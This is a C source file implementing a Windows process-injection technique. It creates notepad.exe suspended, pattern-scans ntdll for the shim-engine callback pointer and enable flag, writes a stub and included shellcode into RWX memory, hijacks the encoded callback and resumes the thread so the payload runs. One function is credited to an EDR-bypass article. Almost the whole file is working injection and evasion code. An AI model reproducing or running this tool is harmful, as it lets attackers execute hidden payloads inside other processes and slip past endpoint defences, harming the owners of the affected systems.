/*
   
*/


#include <Windows.h>
#include <stdio.h>
#include "x64_shellcode_output.h"
#define TARGET_PROCESS "notepad.exe"
#define MAX_PATTERN_SIZE 0x20
#define CHECK_IN_RANGE(dwBasePtr, dwPtr, dwSecPtr) \
    ( \
        dwPtr >= (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress) && \
        dwPtr <  (dwBasePtr + ((PIMAGE_SECTION_HEADER) dwSecPtr)->VirtualAddress + ((PIMAGE_SECTION_HEADER) dwSecPtr)->Misc.VirtualSize) ) 


typedef struct _CascadePattern {
    BYTE pData[MAX_PATTERN_SIZE];
    UINT8 un8Size;
    UINT8 un8PcOff; // Rip - PointerToOffset
} CascadePattern;


/* Stolen from -> https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html */
LPVOID encode_system_ptr(LPVOID ptr) {
    // get pointer cookie from SharedUserData!Cookie (0x330)
    ULONG cookie = *(ULONG*)0x7FFE0330;

    // encrypt our pointer so it'll work when written to ntdll
    return (LPVOID)_rotr64(cookie ^ (ULONGLONG)ptr, cookie & 0x3F);
}

LPVOID find_pattern(LPBYTE pBuffer, DWORD dwSize, LPBYTE pPattern, DWORD dwPatternSize)
{
    if ( dwSize > dwPatternSize ) // Avoid OOB
        while ( (dwSize--) - dwPatternSize ) {
            if ( RtlCompareMemory(pBuffer, pPattern, dwPatternSize) == dwPatternSize )
                return pBuffer;

            pBuffer++;
        }

    return NULL;
}

LPVOID find_SE_DllLoadedAddress(HANDLE hNtDLL, LPVOID *ppOffsetAddress) {
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwTextPtr;
    DWORD_PTR dwMRDataPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwTextStartPtr;
    DWORD_PTR dwTextEndPtr;
    DWORD_PTR dwMRDataEndPtr;

    /* Nt Headers */
    dwPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_DOS_HEADER) hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) &((PIMAGE_NT_HEADERS) dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS) dwPtr)->FileHeader.SizeOfOptionalHeader;

    while ( dwValue-- ) {
        /* Save .text section header */
        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".text") == 0 )
            dwTextPtr = dwPtr;

        /* Find .mrdata section address */
        if ( strcmp(((PIMAGE_SECTION_HEADER) dwPtr)->Name, ".mrdata") == 0 )
            dwMRDataPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwPtr)->VirtualAddress;    

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    /* Points to the beginning of .text section */
    dwResultPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;
    dwTextStartPtr = (DWORD_PTR) hNtDLL + ((PIMAGE_SECTION_HEADER) dwTextPtr)->VirtualAddress;

    /* The end of .text section */
    dwTextPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;
    dwTextEndPtr = dwResultPtr + ((PIMAGE_SECTION_HEADER) dwTextPtr)->Misc.VirtualSize;
    dwMRDataEndPtr=dwMRDataPtr+((PIMAGE_SECTION_HEADER)dwMRDataPtr)->Misc.VirtualSize;
    /*
        We are searching for this pattern:
        8b14253003fe7f       mov     edx, dword ptr [7FFE0330h]
        8bc2                 mov     eax, edx
        488b3d??????00       mov     rdi, qword ptr [ntdll!g_pfnSE_DllLoaded (????????????)]
    */
    
    while ( dwResultPtr = (DWORD_PTR) find_pattern((LPBYTE) dwResultPtr, dwTextPtr-dwResultPtr, "\x8B\x14\x25\x30\x03\xFE\x7F\x8B\xC2\x48\x8B", 11) ) {
        /* Get the offset address */
        dwResultPtr += 12;

        /* Ensure the validity of the opcode we rely on */
        if ( (*(BYTE *)(dwResultPtr + 0x3)) == 0x00 ) {
            /* Set the offset address */
            if ( ppOffsetAddress )
                ( *ppOffsetAddress ) = (LPVOID) dwResultPtr;

            /* Fetch the address */
            dwPtr = (DWORD_PTR) ( *(DWORD32 *) dwResultPtr ) + dwResultPtr + 0x4;
            printf("[DEBUG]  0x%p 0x%p to 0x%p\n", (LPVOID)dwPtr, (LPVOID)dwTextStartPtr,(LPVOID)dwTextEndPtr);
            printf("[DEBUG]  0x%p 0x%p to 0x%p\n", (LPVOID)dwPtr, (LPVOID)dwMRDataPtr,(LPVOID)dwMRDataEndPtr);

            /* Is that address in the range we expect!? */
            if ( dwPtr > dwMRDataPtr && dwPtr < dwMRDataEndPtr ){
                return (LPVOID) dwPtr;
            }
        }
    }

    return NULL;
}


LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
    DWORD dwValue;
    DWORD_PTR dwPtr;
    DWORD_PTR dwResultPtr;
    DWORD_PTR dwEndPtr;
    DWORD_PTR dwDataPtr;
    CascadePattern aPatterns[] = { /* We are looking for these patterns: */
        {
            /*
                c605??????0001       mov     byte ptr [ntdll!g_ShimsEnabled (????????????)], 1
            */
            .pData = "\xc6\x05",
            .un8Size = 0x02,
            .un8PcOff = 0x05
        },
        {
            /*
                443825??????00       cmp     byte ptr [ntdll!g_ShimsEnabled (????????????)], r12b
            */
            .pData = "\x44\x38\x25",
            .un8Size = 0x03,
            .un8PcOff = 0x04
        },

        /* Sentinel */
        { 0x00 }
    };

    /* Nt Headers */
    dwPtr = (DWORD_PTR)hNtDLL + ((PIMAGE_DOS_HEADER)hNtDLL)->e_lfanew;

    /* Get the number of ntdll sections */
    dwValue = ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.NumberOfSections;

    /* The beginning of the section headers */
    dwPtr = (DWORD_PTR) & ((PIMAGE_NT_HEADERS)dwPtr)->OptionalHeader + ((PIMAGE_NT_HEADERS)dwPtr)->FileHeader.SizeOfOptionalHeader;

    while (dwValue--) {
        /* Find .data section header */
        if (strcmp(((PIMAGE_SECTION_HEADER)dwPtr)->Name, ".data") == 0) {
            dwDataPtr = dwPtr;
            break;
        }

        /* Next section header */
        dwPtr += sizeof(IMAGE_SECTION_HEADER);
    }

    /* Look for all specified patterns */
    for (CascadePattern* pPattern = aPatterns; pPattern->un8Size; pPattern++) {
        /* Searching from the address where we found the offset of SE_DllLoadedAddress */
        dwPtr = dwEndPtr = (DWORD_PTR)pDllLoadedOffsetAddress;

        /* Also take a look in the place just before this address */
        dwPtr -= 0xFF;

        /* End of block we are searching in */
        dwEndPtr += 0xFF;

        while (dwPtr = (DWORD_PTR)find_pattern((LPBYTE)dwPtr, dwEndPtr - dwPtr, pPattern->pData, pPattern->un8Size)) {
            /* Jump into the offset */
            dwPtr += pPattern->un8Size;

            /* Ensure the validity of the opcode we rely on */
            if ((*(BYTE*)(dwPtr + 0x3)) == 0x00) {
                /* Fetch the address */
                dwResultPtr = (DWORD_PTR)(*(DWORD32*)dwPtr) + dwPtr + pPattern->un8PcOff;

                /* Is that address in the range we expect!? */
                if (CHECK_IN_RANGE((DWORD_PTR)hNtDLL, dwResultPtr, dwDataPtr))
                    return (LPVOID)dwResultPtr;
            }
        }
    }

    return NULL;
}




int main(int argc, char **argv) {
    HANDLE hNtDLL;
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOA si = { 0 };
    LPVOID pBuffer;
    LPVOID pShimsEnabledAddress;
    LPVOID pSE_DllLoadedAddress;
    LPVOID pPtr;
    int nSuccess = EXIT_FAILURE;
    BOOL bEnable = TRUE;

    si.cb = sizeof( STARTUPINFOA );
        
    printf("[*] Create a process in suspended mode ( %s )\n", TARGET_PROCESS);

    if ( !CreateProcessA(
        NULL, 
        TARGET_PROCESS, 
        NULL, 
        NULL, 
        FALSE, 
        CREATE_SUSPENDED, 
        NULL, 
        (LPCSTR) "C:\\Windows\\System32\\", 
        &si, 
        &pi
    ) )
        return nSuccess;

    puts( "[+] The process has been created successfully" );

    puts( "[*] Getting a handle on NtDLL" );
    hNtDLL = GetModuleHandleA( "NtDLL" );
    printf( "[+] NtDLL Base Address = 0x%p\n", hNtDLL );

    puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
    pSE_DllLoadedAddress = find_SE_DllLoadedAddress( hNtDLL, &pPtr );
    printf( "[+] Found the Callback Address at 0x%p\n", pSE_DllLoadedAddress );

    puts( "[*] Dynamically Search for the Enabling Flag Address ( g_ShimsEnabled )");
    pShimsEnabledAddress = find_ShimsEnabledAddress( hNtDLL, pPtr );
    printf( "[+] Found the Enabling Flag Address at 0x%p\n", pShimsEnabledAddress );

    do {

        puts( "[*] Remotley allocate memory for both stub & shellcode" );
        if ( !(pBuffer = VirtualAllocEx(pi.hProcess, NULL, sizeof(x64_stub) + sizeof(x64_shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) )
            break;

        /* Shellcode address */
        pPtr = (LPVOID)( (DWORD_PTR) pBuffer + sizeof(x64_stub) );

        printf( "[+] Our stub will be injected at 0x%p\n", pBuffer );
        printf( "[+] Our shellcode will be injected at 0x%p\n", pPtr );

        /* Tell the stub where the enabling flag is located */
        RtlCopyMemory( find_pattern(x64_stub, sizeof(x64_stub), "\x11\x11\x11\x11\x11\x11\x11\x11", 8), &pShimsEnabledAddress, sizeof(LPVOID) );

        puts( "[*] Injecting our cascade stub" );
        if ( !WriteProcessMemory(pi.hProcess, pBuffer, x64_stub, sizeof(x64_stub), NULL) )
            break;

        puts( "[+] Our stub has been successfully injected into the remote process" );

        puts( "[*] Injecting our Shellcode" );
        if ( !WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + sizeof(x64_stub)), x64_shellcode, sizeof(x64_shellcode), NULL) )
            break;

        puts( "[+] Our Shellcode has been successfully injected into the remote process" );

        pPtr = encode_system_ptr((LPVOID) pBuffer);
        printf( "[*] The Callback Address has been encoded to 0x%p\n", pPtr );

        puts ("[*] Hijacking the Callback for making it executes our stub" );
        if ( !WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID) &pPtr, sizeof(LPVOID), NULL) )
            break;

        puts( "[+] Hijacking has been done successfully" );

        puts( "[*] Enabling Shim Engine for triggering our stub later" );
        if ( !WriteProcessMemory(pi.hProcess, pShimsEnabledAddress, (LPCVOID) &bEnable, sizeof(BOOL), NULL) )
            break;

        puts( "[+] Shim Engine is enabled now" );
        getchar();
        puts( "[*] Triggering the callback" );
        if ( !ResumeThread(pi.hThread) )
            break;

        puts( "[+] Injection has been done successfully" );
        nSuccess = EXIT_SUCCESS;

    } while( FALSE );

    if ( nSuccess == EXIT_FAILURE )
        puts( "[-] Unfortunately, failed to cascade the process!" );

    puts( "[*] Cleaning up" );
    if ( pi.hThread )
        CloseHandle( pi.hThread );

    if ( pi.hProcess )
        CloseHandle( pi.hProcess );

    return nSuccess;
}
